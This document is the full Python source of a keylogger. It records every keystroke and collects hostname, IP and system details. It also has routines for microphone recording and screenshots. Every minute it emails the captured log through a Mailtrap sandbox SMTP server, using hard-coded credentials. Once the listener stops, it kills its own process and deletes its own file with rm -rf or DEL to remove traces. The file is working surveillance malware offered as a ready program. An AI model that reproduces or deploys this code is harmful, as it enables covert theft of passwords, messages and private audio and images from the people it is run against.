import logging 
import os 
import platform 
import smtplib 
import socket 
import threading 
import wave 
import pyscreenshot 
import sounddevice as sd 
from pynput import keyboard 
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email import encoders


# Mailtrap credentials 
EMAIL_ADDRESS = "b751e6ed66e066" 
EMAIL_PASSWORD = "480ba4e35e703f" 
SEND_REPORT_EVERY = 60  # in seconds 
 
class KeyLogger: 
    def __init__(self, time_interval, email, password): 
        self.interval = time_interval 
        self.log = "KeyLogger Started...\n" 
        self.email = email 
        self.password = password 
 
    def appendlog(self, string): 
        self.log = self.log + string 
 
    def save_data(self, key): 
        try: 
            current_key = str(key.char) 
        except AttributeError: 
            if key == key.space: 
                current_key = "SPACE" 
            elif key == key.esc: 
                current_key = "ESC" 
            else: 
                current_key = " " + str(key) + " " 
 
        self.appendlog(current_key) 
 
    def send_mail(self, email, password, message): 
        sender = "Private Person <from@example.com>" 
        receiver = "A Test User <to@example.com>" 
 
        m = f"""\ 
        Subject: Keylogger Report 
        To: {receiver} 
        From: {sender} 
 
        {message} 
        """ 
 
        try: 
            # Using Mailtrap SMTP settings 
            with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as server: 
                server.starttls()  # Secure the connection 
                server.login(email, password) 
                server.sendmail(sender, receiver, m) 
            print("Email sent successfully") 
        except smtplib.SMTPException as e: 
            print(f"Failed to send email: {e}") 
 
    def report(self): 
        self.send_mail(self.email, self.password, "\n\n" + self.log) 
        self.log = "" 
        timer = threading.Timer(self.interval, self.report) 
        timer.start() 
 
    def system_information(self): 
        hostname = socket.gethostname() 
        ip = socket.gethostbyname(hostname) 
        plat = platform.processor() 
        system = platform.system() 
        machine = platform.machine() 
        self.appendlog(f"Hostname: {hostname}\n") 
        self.appendlog(f"IP: {ip}\n") 
        self.appendlog(f"Processor: {plat}\n") 
        self.appendlog(f"System: {system}\n") 
        self.appendlog(f"Machine: {machine}\n") 
 
    def microphone(self): 
        fs = 44100 
        seconds = SEND_REPORT_EVERY 
        obj = wave.open('sound.wav', 'w') 
        obj.setnchannels(1)  # mono 
        obj.setsampwidth(2) 
        obj.setframerate(fs) 
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) 
        obj.writeframesraw(myrecording) 
        sd.wait() 
        obj.close() 
 
    def screenshot(self): 
        img = pyscreenshot.grab() 
        img.save("screenshot.png") 
        print("Screenshot taken.") 
 
    def run(self): 
        keyboard_listener = keyboard.Listener(on_press=self.save_data) 
        with keyboard_listener: 
            self.report() 
            keyboard_listener.join() 
 
        if os.name == "nt": 
            try: 
                pwd = os.path.abspath(os.getcwd()) 
                os.system("cd " + pwd) 
                os.system("TASKKILL /F /IM " + os.path.basename(__file__)) 
                print('File was closed.') 
                os.system("DEL " + os.path.basename(__file__)) 
            except OSError: 
                print('File is close.') 
 
        else: 
            try: 
                pwd = os.path.abspath(os.getcwd()) 
                os.system("cd " + pwd) 
                os.system('pkill leafpad') 
                os.system("chattr -i " + os.path.basename(__file__)) 
                print('File was closed.') 
                os.system("rm -rf " + os.path.basename(__file__)) 
            except OSError: 
                print('File is close.')

                # Running the keylogger 
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD) 
keylogger.run()

